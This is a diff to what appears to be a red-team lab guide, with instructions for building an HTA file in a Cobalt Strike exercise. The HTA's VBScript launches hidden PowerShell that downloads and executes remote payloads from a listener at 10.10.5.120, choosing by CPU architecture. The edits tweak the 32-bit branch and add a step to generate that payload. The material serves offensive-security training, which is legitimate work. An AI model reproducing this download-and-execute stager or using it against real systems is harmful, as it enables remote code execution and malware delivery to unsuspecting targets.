@@ -38,7 +38,7 @@ To create an HTA, open **Visual Studio Code** on the **attacker-windows** VM
 	  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
 	    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"""
 	  Else
-    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/b'))"""
+        shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"""
 	  End If
 
 	End Function
@@ -51,6 +51,8 @@ To create an HTA, open **Visual Studio Code** on the **attacker-windows** VM
 ```
 
 In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, Type should be powershell. Copy and paste into your HTA (remember to add double quotes around command).
+
+Now create a 32-bit payload for the else statment, add it to your HTA.
 
 Copy/paste this line into the HTA, it should look like this:
 
